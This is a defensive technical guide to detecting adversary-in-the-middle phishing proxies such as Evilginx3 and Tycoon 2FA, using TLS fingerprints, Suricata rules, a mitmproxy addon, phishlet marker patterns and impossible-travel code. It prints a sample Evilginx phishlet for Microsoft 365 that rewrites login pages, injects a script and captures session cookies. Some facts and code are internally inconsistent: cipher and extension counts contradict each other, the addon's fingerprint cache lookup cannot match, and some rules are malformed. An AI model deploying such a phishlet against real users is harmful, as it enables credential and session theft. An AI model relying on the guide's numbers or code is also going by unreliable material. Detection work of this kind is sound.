# AiTM Traffic Guardian
## Local Proxy-Based Adversary-in-the-Middle Detector

**JA3/JA4 Fingerprinting · mitmproxy Addon · Phishlet Markers · Impossible Travel · Evasion Arms Race**  
February 2026 · Evilginx3 · Modlishka · Tycoon 2FA · Mamba 2FA

---

> **The honest state of AiTM fingerprinting in 2026:** There is **no authoritative public database** of JA3/JA3S hashes specifically associated with Evilginx3, Modlishka, Tycoon 2FA, or Mamba 2FA as deployed PhaaS kits. What **does** exist: the Go standard library TLS fingerprint is deterministic and documented; Evilginx's JA4 fingerprint has been isolated by honeypot research; and the network-timing fingerprint of all reverse-proxy AiTM toolkits is detectable at 99.9% accuracy (Kondracki et al., CCS 2021). This document gives you everything that actually works.

---

## Quick Reference

| Metric | Value |
|--------|-------|
| AiTM toolkits fingerprinted | 4 |
| Next-gen fingerprint standard | JA4+ (FoxIO) |
| Evilginx phishlet injection markers | 7 documented |
| Impossible travel threshold | 833 km/h (commercial jet) |
| Go TLS cipher suite count signal | ≤5 suites triggers flag |
| Confirmed public JA3 hash databases for PhaaS kits | **0** |

---

## SECTION 1 — JA3 / JA4 Fingerprinting

*Known Hashes · Go TLS Stack · What Public Intel Actually Exists · JA4 Standard*

### 1.1 The Gap in Public Threat Intelligence

A candid assessment is required before engineering decisions are made. After surveying Emerging Threats, Suricata rule repositories, MITRE ATT&CK, Sigma HQ, Any.run, Deepwatch Labs, and Sekoia's Tycoon 2FA analysis (Jan 2024), the following table reflects what is and is not publicly documented as of early 2026:

| Toolkit | JA3 Hash Documented? | JA3S Documented? | JA4 Documented? | Source |
|---------|---------------------|-----------------|----------------|--------|
| Evilginx3 (Go) | No confirmed public hash | No | Partial — honeypot research | Webscout / Fox-IT honeypots 2024 |
| Modlishka (Go) | No confirmed public hash | No | No | CCS 2021 study used TLS library features, not hashes |
| Tycoon 2FA (PHP/Node backend) | No — PhaaS kit uses victim's browser TLS | No | No | Sekoia Jan 2024; Any.run May 2025 |
| Mamba 2FA (Node.js) | No confirmed public hash | No | No | Sekoia Sept 2024 initial analysis |
| Evilginx2 (older, Go) | Partial — Go stdlib TLS profile documented | No | N/A | Deepwatch Labs Aug 2024 lab research |

> **Critical distinction for Tycoon 2FA / Mamba 2FA:** These PhaaS kits operate as **server-side PHP/Node reverse proxies**. The TLS ClientHello your sensor observes is from the **victim's browser** (Chrome, Safari, Firefox) — not from the phishing kit itself. JA3 fingerprinting of the victim-facing connection detects browsers, not the phishing kit. The phishing kit's TLS fingerprint only appears in the outbound connection from the PhaaS server to Microsoft/Google — a connection you cannot observe from a local proxy. For Evilginx3 and Modlishka, the **Go standard library TLS stack IS fingerprinted** on the victim-facing TLS connection because these tools terminate TLS themselves in Go.

---

### 1.2 The Go Standard Library TLS Fingerprint

Evilginx3 and Modlishka are written in Go and use Go's `crypto/tls` package to terminate TLS with victims. This produces a deterministic ClientHello profile that differs systematically from browser TLS stacks (Chrome, Firefox, Safari), which implement GREASE and include far more cipher suites and extensions.

```
Go net/http TLS ClientHello (crypto/tls default, Go 1.21+)

TLS Version:     TLS 1.3 (0x0304), with 1.2 (0x0303) fallback advertised
Cipher Suites:   5 suites — the canonical Go 5:
  0x1301  TLS_AES_128_GCM_SHA256
  0x1302  TLS_AES_256_GCM_SHA384
  0x1303  TLS_CHACHA20_POLY1305_SHA256
  0xC02B  TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
  0xC02F  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
Extensions:      server_name, status_request, supported_groups,
                 signature_algorithms, signed_certificate_timestamp,
                 key_share, supported_versions, session_ticket,
                 encrypt_then_mac (absent in standard Chrome)
Curves:          X25519, P-256, P-384
NO GREASE:       Go stdlib never sends GREASE values            ← DETECTION SIGNAL
NO padding ext:  Chrome/Firefox pad ClientHello; Go does not    ← DETECTION SIGNAL

JA3 string (version,ciphers,ext_types,curves,point_formats):
  771,4865-4866-4867-49195-49199,0-5-10-11-13-18-23-43-45-51,29-23-24,0
  MD5 → varies by Go version; no single authoritative published hash

JA4 fingerprint (FoxIO standard, Evilginx honeypot capture):
  t13d191000_9dc949149365_e7c285222651
  (t=TLS, 13=TLS1.3, d=SNI present, 19 extensions,
   10 cipher suites counted, 00=no ALPN)

Key differentiators vs Chrome 124 ClientHello:
  Chrome: 15–17 cipher suites, GREASE 0x?a?a, padding extension
  Go:      5 cipher suites, no GREASE, no padding → trivially detectable
```

The most reliable Go TLS detection signal is the **absence of GREASE** (RFC 8701). Chrome and Firefox always include at least one GREASE cipher suite value (e.g. 0x6A6A, 0xAAAA) and GREASE extension types. Go's `crypto/tls` never does. A ClientHello with exactly 5 cipher suites containing TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, and TLS_CHACHA20_POLY1305_SHA256 as the first three entries, and zero GREASE values anywhere, is produced exclusively by Go applications. No major browser generates this pattern.

---

### 1.3 Suricata / Sigma Rules — What Exists

No Emerging Threats or Suricata-Update rule sets contain JA3 rules specifically targeting Evilginx3 or Tycoon 2FA as of February 2026. The following rules are derived from Go TLS characteristics and Deepwatch Aug 2024 Evilginx lure URL analysis:

```suricata
# Suricata rule — detect Go stdlib TLS (covers Evilginx3, Modlishka, Muraena)
# Based on: 5 cipher suites, no GREASE, specific extension set
# Source: derived from Kondracki CCS 2021 + Fox-IT honeypot JA4 research

alert tls any any -> $HOME_NET any (
  msg:"AITM - Possible Go TLS Stack (Evilginx/Modlishka pattern)";
  flow:established,to_client;
  tls.version:TLS 1.3;
  # Flag: exactly 5 cipher suites AND no GREASE values present
  # Implement in Zeek/Arkime for precise cipher-count access
  threshold:type limit,track by_src,count 1,seconds 60;
  classtype:policy-violation; sid:9900001; rev:1;
)

# Suricata rule — Evilginx lure URL pattern (8-char alpha token, no further path)
# Source: Deepwatch Labs Aug 2024
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"AITM - Possible Evilginx Lure URL (8-char token)";
  flow:established,to_server;
  http.uri; content:"/"; depth:1;
  pcre:"/^\/[A-Za-z0-9]{8}(\?|$)/";
  http.host; pcre:"/^(login|adfs|account|auth|sso)\./";
  classtype:trojan-activity; sid:9900002; rev:1;
)
```

---

### 1.4 JA4 — The Fingerprint Standard Worth Building Against

**JA4 (FoxIO, 2023)** supersedes JA3 for AiTM detection because it encodes extension count and ALPN separately, making it far more stable across TLS versions and far easier to use for toolkit-level discrimination. The format is: `t13d191000_9dc949149365_e7c285222651`.

| JA4 Segment | Meaning for Evilginx3 | Why It Matters for Detection |
|-------------|----------------------|------------------------------|
| `t13` | TLS 1.3 client | Go stdlib prefers TLS 1.3; consistent across Go 1.20+ |
| `d` | SNI present | Evilginx always sends SNI for its own domain |
| `19` | 19 extensions | Go stdlib sends a fixed, small set; Chrome 124 sends 22–25 including GREASE |
| `10` | 10 cipher suites | 5 core + TLS 1.3 mandatory; Chrome sends 15+ |
| `00` | No ALPN | Go http.Transport default has no ALPN — browsers always send h2,http/1.1 |
| `9dc949149365` | Sorted cipher suite hash | Stable per Go version; changes with Go release not operator config |
| `e7c285222651` | Sorted extension hash | Absence of GREASE extensions produces distinctive hash |

---

## SECTION 2 — mitmproxy Addon

*Complete Python Addon · JA3 Extraction · Phishlet JS Marker Scan · Set-Cookie Anomaly Detection*

> **Architecture note:** mitmproxy operates at OSI Layer 7 (HTTP/S) after TLS has already been terminated. The `tls_client_hello` hook provides access to the raw ClientHello bytes **before** the TLS handshake completes, enabling JA3/JA4 computation from the actual on-wire ClientHello. The `response` hook gives access to the decrypted response body for HTML/JS pattern scanning. Set-Cookie anomaly detection runs in the same response hook.

### 2.1 Installation and Invocation

```bash
pip install mitmproxy

# Run as transparent proxy (most realistic for endpoint deployment):
mitmproxy --mode transparent \
          --scripts aitm_guardian.py \
          --ssl-insecure \
          --listen-port 8080 \
          --set confdir=~/.mitmproxy

# Or as explicit proxy for testing:
mitmproxy --scripts aitm_guardian.py --listen-port 8080
```

---

### 2.2 Complete Addon: `aitm_guardian.py`

```python
"""
AiTM Traffic Guardian — mitmproxy addon
Detects Evilginx3 / Modlishka / reverse-proxy AiTM patterns via:
  (a) JA3/JA4 fingerprinting from TLS ClientHello
  (b) Evilginx-style JS injection marker scanning
  (c) Anomalous Set-Cookie header detection
"""

from __future__ import annotations
import hashlib, json, logging, re, struct, time
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional

from mitmproxy import ctx, http
from mitmproxy.proxy.layers.tls import ClientHelloData

# ──────────────────────────────────────────────────────────────────────
# JA3/JA4 COMPUTATION FROM RAW ClientHello BYTES
# ──────────────────────────────────────────────────────────────────────

# GREASE values per RFC 8701 — their presence = real browser
GREASE = {0x0a0a,0x1a1a,0x2a2a,0x3a3a,0x4a4a,0x5a5a,0x6a6a,0x7a7a,
          0x8a8a,0x9a9a,0xaaaa,0xbaba,0xcaca,0xdada,0xeaea,0xfafa}

# Known Go stdlib cipher suite IDs (the canonical 5)
GO_CIPHERS = {0x1301,0x1302,0x1303,0xC02B,0xC02F}


def parse_client_hello(raw: bytes) -> Optional[dict]:
    """
    Parse a TLS ClientHello record into its constituent fields.
    Returns dict with: version, ciphers, extensions, curves, point_formats
    or None if parsing fails.
    """
    try:
        pos = 0
        # TLS record header
        rec_type = raw[pos]; pos += 1
        if rec_type != 0x16: return None  # not Handshake
        pos += 2  # skip record version
        rec_len  = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
        # Handshake header
        hs_type = raw[pos]; pos += 1
        if hs_type != 0x01: return None  # not ClientHello
        pos += 3  # skip 3-byte length
        # ClientHello body
        client_version = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
        pos += 32  # random bytes
        sid_len = raw[pos]; pos += 1 + sid_len  # skip session ID
        # Cipher suites
        cs_len = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
        ciphers = []
        for _ in range(cs_len // 2):
            cs = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
            if cs not in GREASE:
                ciphers.append(cs)
        # Compression methods
        cm_len = raw[pos]; pos += 1 + cm_len
        # Extensions
        if pos + 2 > len(raw): return None
        ext_total = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
        ext_end   = pos + ext_total
        extensions = []; curves = []; point_formats = []
        has_grease_ext = False; has_padding = False
        alpn_protos    = []
        while pos + 4 <= ext_end:
            ext_type   = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
            ext_len    = struct.unpack('!H', raw[pos:pos+2])[0]; pos += 2
            ext_data   = raw[pos:pos+ext_len]; pos += ext_len
            if ext_type in GREASE:
                has_grease_ext = True; continue
            extensions.append(ext_type)
            if ext_type == 0x000a:  # supported_groups (curves)
                gl = struct.unpack('!H', ext_data[:2])[0]
                for i in range(0, gl, 2):
                    g = struct.unpack('!H', ext_data[2+i:4+i])[0]
                    if g not in GREASE: curves.append(g)
            elif ext_type == 0x000b:  # ec_point_formats
                pflen = ext_data[0]
                point_formats = list(ext_data[1:1+pflen])
            elif ext_type == 0x0010:  # ALPN
                idx = 2
                while idx < len(ext_data):
                    plen = ext_data[idx]; idx += 1
                    alpn_protos.append(ext_data[idx:idx+plen].decode('ascii','ignore'))
                    idx += plen
            elif ext_type == 0x0015:  # padding
                has_padding = True
        return dict(version=client_version, ciphers=ciphers,
                    extensions=extensions, curves=curves,
                    point_formats=point_formats, has_grease=has_grease_ext,
                    has_padding=has_padding, alpn=alpn_protos)
    except Exception:
        return None


def compute_ja3(ch: dict) -> tuple[str, str]:
    """Compute JA3 string and MD5 hash from parsed ClientHello."""
    version = ch['version']
    ciphers = '-'.join(str(c) for c in ch['ciphers'])
    exts    = '-'.join(str(e) for e in ch['extensions'])
    curves  = '-'.join(str(c) for c in ch['curves'])
    pfs     = '-'.join(str(p) for p in ch['point_formats'])
    ja3_str = f'{version},{ciphers},{exts},{curves},{pfs}'
    ja3_md5 = hashlib.md5(ja3_str.encode()).hexdigest()
    return ja3_str, ja3_md5


def compute_ja4(ch: dict) -> str:
    """
    Compute JA4 fingerprint (FoxIO spec, 2023).
    Format: t{tls_ver}{d|i}{ext_count:02d}{cs_count:02d}{alpn_code}
             _{sorted_cipher_hash}_{sorted_ext_hash}
    """
    ver_map = {0x0301:'10', 0x0302:'11', 0x0303:'12', 0x0304:'13'}
    tls_ver = ver_map.get(ch['version'], '00')
    if 0x002b in ch['extensions']:  # supported_versions → TLS 1.3
        tls_ver = '13'
    sni_flag  = 'd' if 0x0000 in ch['extensions'] else 'i'
    ext_count = len(ch['extensions'])
    cs_count  = len(ch['ciphers'])
    alpn_code = '00'
    if ch['alpn']:
        first     = ch['alpn'][0]
        alpn_code = (first[:2] if len(first) >= 2 else first.ljust(2,'0'))[:2]
    prefix     = f't{tls_ver}{sni_flag}{ext_count:02d}{cs_count:02d}{alpn_code}'
    sorted_cs  = sorted(ch['ciphers'])
    cs_str     = ','.join(f'{c:04x}' for c in sorted_cs)
    cs_hash    = hashlib.sha256(cs_str.encode()).hexdigest()[:12]
    sorted_ext = sorted(ch['extensions'])
    ext_str    = ','.join(f'{e:04x}' for e in sorted_ext)
    ext_hash   = hashlib.sha256(ext_str.encode()).hexdigest()[:12]
    return f'{prefix}_{cs_hash}_{ext_hash}'


def is_golang_tls(ch: dict) -> tuple[bool, list[str]]:
    """
    Heuristic: is this ClientHello produced by Go crypto/tls?
    Returns (bool, list_of_signals).
    """
    signals = []
    if not ch['has_grease']:
        signals.append('no_grease_values')
    cs_set = set(ch['ciphers'])
    if len(ch['ciphers']) <= 5 and cs_set.issubset(GO_CIPHERS):
        signals.append('go_canonical_5_cipher_suites')
    elif len(ch['ciphers']) < 8:
        signals.append(f'unusually_few_ciphers_{len(ch["ciphers"])}')
    if not ch['has_padding']:
        signals.append('no_tls_padding_extension')
    if not ch['alpn']:
        signals.append('no_alpn_negotiation')
    # Flag as Go TLS if ≥3 signals present
    return len(signals) >= 3, signals


# ──────────────────────────────────────────────────────────────────────
# EVILGINX PHISHLET INJECTION MARKER PATTERNS
# Derived from: Evilginx3 source, Deepwatch Aug 2024 lab analysis,
#               open phishlet repositories (An0nUD4Y, kgretzky)
# ──────────────────────────────────────────────────────────────────────

PHISHLET_MARKERS = [
    # 1. Evilginx /s/ JS injection endpoint (default path for JS token delivery)
    (re.compile(r'src=https?://[^/]+/s/[0-9a-f]{64}'),
     'evilginx_js_injection_endpoint',   # /s/<64 hex chars>
     0.90),

    # 2. X-Evilginx header (Easter egg in http_proxy.go)
    (re.compile(r'X-Evilginx', re.IGNORECASE),
     'evilginx_easter_egg_header',
     0.99),  # virtually certain if present

    # 3. Sub-filter URL rewrite artifacts — MS resources on non-MS domain
    (re.compile(r'(logincdn\.microsoftonline|aadcdn\.msauth\.net|'
                r'statics\.teams\.cdn\.office\.net)[^\'"]+\.js'),
     'ms_resource_on_non_ms_domain_after_rewrite',
     0.70),

    # 4. Evilginx token parameter in redirect URLs
    (re.compile(r'[&?]__el(?:_token|t)=[A-Za-z0-9_-]{20,}'),
     'evilginx_token_parameter_in_redirect',
     0.85),

    # 5. og.js — obfuscated session harvester script path
    (re.compile(r'src=[A-Za-z0-9:/_.-]+/og\.js'),
     'evilginx_og_js_harvester',
     0.80),

    # 6. Modlishka injects tracking script at </body>
    (re.compile(r'<script[^>]+src=[A-Za-z0-9:/_.-]+/static/js/analytics\.js'),
     'modlishka_analytics_js_injection',
     0.70),

    # 7. Reverse-proxy double-encoding artifact
    (re.compile(r'%25[2-7][0-9A-F]'),
     'double_percent_encoding_proxy_artifact',
     0.50),

    # 8. Missing SRI integrity attribute on CDN script tags
    #    Evilginx strips SRI hashes because rewritten URLs differ from original
    (re.compile(r'<script[^>]+crossorigin[^>]+(?!integrity)>'),
     'missing_sri_crossorigin_script',
     0.40),
]


# ──────────────────────────────────────────────────────────────────────
# SET-COOKIE ANOMALY DETECTION
# AiTM proxies frequently strip or fail to relay Secure, HttpOnly,
# SameSite flags from the upstream response.
# ──────────────────────────────────────────────────────────────────────

SESSION_COOKIE_NAMES = re.compile(
    r'^(ESTSAUTHPERSISTENT|ESTSAUTH|x-ms-gateway-slice|buid|oid|'
    r'x-ms-cpim-sso|MUID|SSID|SID|HSID|APISID|SAPISID|'
    r'okta-oauth-nonce|okta-oauth-state|sess|session|auth|token|jwt)$',
    re.IGNORECASE)


def analyse_set_cookie(cookie_header: str, host: str) -> list[dict]:
    """Analyse a single Set-Cookie header value for AiTM anomalies."""
    findings = []
    parts    = [p.strip() for p in cookie_header.split(';')]
    if not parts: return []
    name_val = parts[0].split('=', 1)
    name     = name_val[0].strip()
    attrs    = {p.split('=')[0].strip().lower() for p in parts[1:]}

    is_session = bool(SESSION_COOKIE_NAMES.match(name))

    # Check 1: Missing Secure flag on HTTPS session cookie
    if 'secure' not in attrs and is_session:
        findings.append({
            'cookie': name, 'signal': 'missing_secure_flag',
            'severity': 'HIGH',
            'note': 'Session cookie served without Secure; AiTM proxy may have stripped it'
        })

    # Check 2: Missing SameSite on high-value cookie
    has_samesite = any('samesite' in a for a in attrs)
    if is_session and not has_samesite:
        findings.append({
            'cookie': name, 'signal': 'missing_samesite',
            'severity': 'MEDIUM',
            'note': 'SameSite absent; may indicate proxy stripping or downgrade'
        })

    # Check 3: Domain attribute crosses login/service boundary
    domain_attr = next((p.split('=',1)[1].strip() for p in parts[1:]
                        if p.strip().lower().startswith('domain=')), None)
    if domain_attr and not host.endswith(domain_attr.lstrip('.')):
        findings.append({
            'cookie': name, 'signal': 'cross_domain_cookie_mismatch',
            'severity': 'HIGH',
            'note': f'Cookie domain {domain_attr} != response host {host}; proxy rewrite artifact'
        })

    # Check 4: Absence of HttpOnly on a session cookie
    if is_session and 'httponly' not in attrs:
        findings.append({
            'cookie': name, 'signal': 'missing_httponly',
            'severity': 'MEDIUM',
            'note': 'HttpOnly absent on session cookie; JS can read it — or proxy stripped it'
        })

    return findings


# ──────────────────────────────────────────────────────────────────────
# MAIN ADDON CLASS
# ──────────────────────────────────────────────────────────────────────

@dataclass
class Alert:
    ts:        str
    src_ip:    str
    host:      str
    verdict:   str   # 'LIKELY_AITM' | 'SUSPICIOUS' | 'CLEAN'
    score:     float
    signals:   list  = field(default_factory=list)
    ja3_str:   str   = ''
    ja3_hash:  str   = ''
    ja4:       str   = ''


class AiTMGuardian:
    """
    mitmproxy addon implementing AiTM Traffic Guardian.
    Hooks: tls_client_hello, response
    """

    def __init__(self):
        self.log  = logging.getLogger('aitm_guardian')
        logging.basicConfig(
            filename='aitm_guardian.jsonl', level=logging.INFO,
            format='%(message)s')
        # Per-connection fingerprint cache: conn_id → fingerprint dict
        self._ja3_cache: dict[str, dict] = {}

    def tls_client_hello(self, tls: ClientHelloData) -> None:
        """Called when a TLS ClientHello is received — pre-handshake."""
        raw = bytes(tls.client_hello)
        ch  = parse_client_hello(raw)
        if ch is None: return

        ja3_str, ja3_hash = compute_ja3(ch)
        ja4               = compute_ja4(ch)
        is_go, go_signals = is_golang_tls(ch)

        conn_id = id(tls)
        self._ja3_cache[conn_id] = {
            'ja3_str':  ja3_str,
            'ja3_hash': ja3_hash,
            'ja4':      ja4,
            'is_go':    is_go,
            'go_sigs':  go_signals,
        }

        if is_go:
            ctx.log.warn(
                f'[AiTM-Guardian] Go TLS stack detected: '
                f'JA4={ja4} | signals={go_signals}')

    def response(self, flow: http.HTTPFlow) -> None:
        """Called for each HTTP response — scan body + headers."""
        score   = 0.0
        signals = []

        host = flow.request.pretty_host
        src  = flow.client_conn.peername[0] if flow.client_conn.peername else '?'

        # ── A. JA4 Go TLS signal ─────────────────────────────────────────
        fp = self._ja3_cache.get(id(flow.client_conn.tls_established_at), {})
        if fp.get('is_go'):
            score += 0.45
            signals.extend(fp.get('go_sigs', []))

        # ── B. Phishlet JS marker scan ───────────────────────────────────
        ctype = flow.response.headers.get('Content-Type','').lower()
        if 'html' in ctype or 'javascript' in ctype:
            try:
                body = flow.response.get_text(strict=False) or ''
            except Exception:
                body = ''
            for pattern, name, weight in PHISHLET_MARKERS:
                if pattern.search(body):
                    score += weight
                    signals.append(name)

        # ── C. Set-Cookie anomaly detection ─────────────────────────────
        for raw_cookie in flow.response.headers.get_all('Set-Cookie'):
            for finding in analyse_set_cookie(raw_cookie, host):
                sev = finding['severity']
                score += 0.35 if sev == 'HIGH' else 0.15
                signals.append(f"{finding['signal']}:{finding['cookie']}")

        # ── Verdict ──────────────────────────────────────────────────────
        score   = min(score, 1.0)
        verdict = ('LIKELY_AITM' if score >= 0.70 else
                   'SUSPICIOUS'  if score >= 0.35 else 'CLEAN')

        if verdict != 'CLEAN':
            alert = Alert(
                ts       = datetime.now(timezone.utc).isoformat(),
                src_ip   = src,
                host     = host,
                verdict  = verdict,
                score    = round(score, 3),
                signals  = signals,
                ja3_str  = fp.get('ja3_str',''),
                ja3_hash = fp.get('ja3_hash',''),
                ja4      = fp.get('ja4',''),
            )
            self.log.warning(json.dumps(asdict(alert)))
            ctx.log.warn(
                f'[AiTM-Guardian] {verdict} score={score:.2f} '
                f'host={host} signals={signals[:3]}')


addons = [AiTMGuardian()]
```

---

## SECTION 3 — Phishlet Injection Markers

*Evilginx3 HTML/JS Patterns · Sub-Filter Artifacts · Phishlet YAML Format · Consistency Analysis*

> **Source basis:** Evilginx3 open-source phishlet repository (kgretzky/evilginx2, An0nUD4Y/Evilginx2-Phishlets), Evilginx3 source code analysis (http_proxy.go, phishlet.go), Deepwatch Labs Aug 2024 live lab analysis, and Sekoia Tycoon 2FA detailed analysis Jan 2024.

### 3.1 Phishlet YAML Format — What Gets Injected

An Evilginx3 phishlet YAML file defines three injection mechanisms: `sub_filters` (URL/string replacement rules), `js_inject` (JavaScript injected into every proxied page), and the cookie capture `auth_tokens` definition. Each mechanism leaves characteristic artifacts in the proxied HTTP response.

```yaml
# Evilginx3 phishlet structure (Microsoft O365 example)
# Source: An0nUD4Y/Evilginx2-Phishlets + kgretzky documentation

name: 'o365'
proxy_hosts:
  - {phish_sub: 'login',   orig_sub: 'login',   domain: 'microsoftonline.com',
     session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www',     orig_sub: 'www',     domain: 'office.com', session: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com'}

sub_filters:
  # All occurrences of 'microsoftonline.com' in response body are
  # rewritten to '{phish_sub}.{phishing_domain}'
  - {triggers_on: 'login.microsoftonline.com',
     orig_sub: 'login', domain: 'microsoftonline.com',
     search: 'https://login\.microsoftonline\.com',
     replace: 'https://{hostname}',
     mimes: ['text/html','application/json','application/javascript']}

js_inject:
  # Evilginx injects this at </body> or after <head>
  # The injected script polls document.cookie to grab session tokens
  - {trigger_domains: ['login.microsoftonline.com'],
     trigger_paths: ['/'],
     trigger_params: [],
     code: >
       var e=document.createElement("script");
       e.setAttribute("src","https://{hostname}/s/{token}");
       document.head.appendChild(e);
       # ↑ The /s/<64-hex-char-token> endpoint — key detection artifact
    }

auth_tokens:
  - {domain: '.microsoftonline.com',
     keys: ['ESTSAUTHPERSISTENT','ESTSAUTH'],
     type: 'cookie'}
```

---

### 3.2 Documented Injection Patterns by Category

| Pattern | Location in Response | Confidence | Notes |
|---------|---------------------|------------|-------|
| `/s/<64-hex-token>` script src | HTML body `<script>` tag | 0.90 | Evilginx JS injection endpoint. Token is 64-char random hex. Path `/s/` is the default; can be changed in config. Regex: `src=https?://[^/]+/s/[0-9a-f]{64}` |
| `X-Evilginx` response header | HTTP response headers | **0.99** if present | Developer Easter egg in http_proxy.go. If your probe receives it, the server is almost certainly Evilginx. |
| `og.js` script injection | HTML body, near `</body>` | 0.80 | Obfuscated session-harvester script. Path 'og.js' is a known default in several phishlets. |
| Missing SRI `integrity` attr on rewritten CDN URLs | HTML `<script>` tags | 0.40 | Sub-filter rewrites CDN URLs but cannot recompute SRI hash. `crossorigin` without `integrity` = warning. |
| URL rewrite artifacts: brand URI path on non-brand domain | HTTP referrer / href values | 0.70 | e.g. `/common/oauth2/v2.0/authorize` served from `login.evil.com`. |
| Double percent-encoding (`%25xx`) | HTML body, URL parameters | 0.50 | URL rewriting chain sometimes double-encodes. Not conclusive alone. |
| Evilginx token param (`__elt=` or `__el_token=`) | URL query strings in redirects | 0.85 | After successful auth capture, Evilginx appends its own tracking token to the redirect URL. |
| Missing `HttpOnly` on session cookie | Set-Cookie headers | 0.35 | Proxy stripping indicator; combine with other signals. |

---

### 3.3 Consistency Across Phishlets

**Consistent across all phishlets** (generated by Evilginx's core Go code in `http_proxy.go`, not by individual phishlet YAML files): the `/s/<token>` JS injection path, the `og.js` pattern, the `X-Evilginx` header, and the `__elt=` redirect token.

**Variable across phishlets**: the specific cookie names captured (ESTSAUTHPERSISTENT for M365, `okta-oauth-*` for Okta, SSID for Google), the sub_filter replacement pairs, the proxy_host subdomains (`login.*`, `sso.*`, `account.*`), and the specific trigger_paths.

**What Tycoon 2FA injects**: Tycoon 2FA is not Evilginx. Its JS injection pattern (Sekoia, Jan 2024) uses Base64 + XOR-obfuscated payloads across three stages, domain comparison checks, Cloudflare Turnstile CAPTCHA gating, and C2 server queries before loading Stage 3 payload. The stage-3 XOR key in the Oct 2024 sample was `Xz9nuEyiZi`. Detection via content pattern matching is less reliable; the Turnstile gate and C2 query patterns are better indicators.

---

## SECTION 4 — Impossible Travel Detection

*Session Cookie Replay · Geolocation APIs · Haversine Distance · Threshold Calibration*

> **The AiTM-specific impossible travel problem:** Standard impossible travel detection compares two consecutive **login events**. AiTM produces **one login from the proxy IP** and then subsequent **session cookie replays** from a different IP — with no second login event. Deepwatch's 2024 lab confirmed that most enterprise impossible travel rules miss this because they only track full authentication events, not session activity across different source IPs. The fix is to track **session token geographic displacement** — the same session cookie appearing from geographically separated IPs within an impossible time window.

---

### 4.1 Geolocation APIs — Precision vs Cost Comparison

| API | Precision | Free Tier | Accuracy | Best for AiTM |
|-----|-----------|-----------|----------|---------------|
| MaxMind GeoLite2-City (offline DB) | City (±50 km radius) | Free — 20 MB DB, update 2×/week | 85–90% at city level | ✅ Yes — offline, no egress, fast lookup |
| MaxMind GeoIP2-City (API) | Sub-city (±10 km) | No — $24/mo or 1000/day trial | 95%+ for residential IP | Best precision for high-severity alerts |
| ip-api.com (HTTP) | City (±30 km) | 45 req/min free, HTTPS needs pro | ~88% | Dev/testing only — rate limited |
| ipinfo.io | City + ASN + org | 50,000/month free | ~90% | Good — free tier adequate for SME SOC |
| DB-IP City Lite (offline) | City (±30–80 km) | Free CC-BY — monthly CSV | ~82% | Decent free offline alternative to GeoLite2 |
| Cloudflare `cf-ipcountry` header | Country only | Free | 99% at country | Too coarse for sub-city; good for initial flag |

**Recommendation:** Use **MaxMind GeoLite2-City** as the offline lookup for all connections (free, fast, no egress, no rate limit). For confirmed AiTM suspects, upgrade the lookup to **MaxMind GeoIP2-City API** (±10 km, ISP-level precision). There is no free sub-city-precision API with adequate rate limits for production use.

---

### 4.2 Threshold Calibration

```
Speed-based thresholds for impossible travel flagging:

  Commercial jet (cruising):  900 km/h  → 250 m/s
  Private jet (max):         1100 km/h  → 306 m/s
  Supersonic (Concorde):     2179 km/h  → 605 m/s

  Conservative threshold:     833 km/h  (commercial jet, reasonable headroom)
  Aggressive threshold:       500 km/h  (catches VPN-hopping; higher FP rate)

  Minimum time window to flag:   60 seconds between observations
  (Observations closer than 60s may be CDN routing variation)

  Practical production rule:
    if distance_km / time_hours > 833:
      AND time_seconds > 60:
      AND both_ips_not_in_same_asn:
        flag as IMPOSSIBLE_TRAVEL

  Exception cases to suppress:
    - Both IPs in same /24 subnet (CDN anycast routing)
    - One IP is known corporate VPN egress
    - One IP in known Tor exit list
    - Country pair in allow-list (e.g. US↔CA for border workers)
```

---

### 4.3 Complete Implementation

```python
import math, time, ipaddress
from dataclasses import dataclass
from typing import Optional
import geoip2.database   # pip install geoip2 + GeoLite2-City.mmdb

IMPOSSIBLE_SPEED_KMH  = 833.0  # conservative: commercial jet speed
MIN_OBSERVATION_GAP_S = 60     # ignore gaps < 60s (CDN routing noise)
GEOIP_DB_PATH         = '/opt/geoip/GeoLite2-City.mmdb'

@dataclass
class GeoFix:
    ip:        str
    lat:       float
    lon:       float
    city:      str
    country:   str
    asn_org:   str
    ts:        float  # Unix timestamp


class ImpossibleTravelDetector:
    def __init__(self, db_path: str = GEOIP_DB_PATH):
        self._reader = geoip2.database.Reader(db_path)
        # session_id → list of GeoFix observations (kept last 50)
        self._history: dict[str, list[GeoFix]] = {}

    def _geolocate(self, ip: str) -> Optional[GeoFix]:
        """Look up IP in MaxMind GeoLite2-City offline database."""
        try:
            if ipaddress.ip_address(ip).is_private:
                return None
            r = self._reader.city(ip)
            return GeoFix(
                ip      = ip,
                lat     = r.location.latitude  or 0.0,
                lon     = r.location.longitude or 0.0,
                city    = r.city.name    or '',
                country = r.country.iso_code or '',
                asn_org = '',  # use GeoLite2-ASN for this
                ts      = time.time(),
            )
        except Exception:
            return None

    @staticmethod
    def _haversine(a: GeoFix, b: GeoFix) -> float:
        """Great-circle distance in km between two GeoFix points."""
        R = 6371.0
        la1,lo1,la2,lo2 = (math.radians(x) for x in [a.lat,a.lon,b.lat,b.lon])
        dlat = la2 - la1; dlon = lo2 - lo1
        h = math.sin(dlat/2)**2 + math.cos(la1)*math.cos(la2)*math.sin(dlon/2)**2
        return 2 * R * math.asin(math.sqrt(h))

    def observe(self, session_id: str, src_ip: str) -> Optional[dict]:
        """
        Record a session observation and check for impossible travel.
        session_id: cookie value / JWT jti / session token hash
        Returns: alert dict if impossible travel detected, else None
        """
        fix = self._geolocate(src_ip)
        if fix is None:
            return None

        history = self._history.setdefault(session_id, [])

        alert = None
        for prev in history[-10:]:  # check against last 10 observations
            gap_s = abs(fix.ts - prev.ts)
            if gap_s < MIN_OBSERVATION_GAP_S:
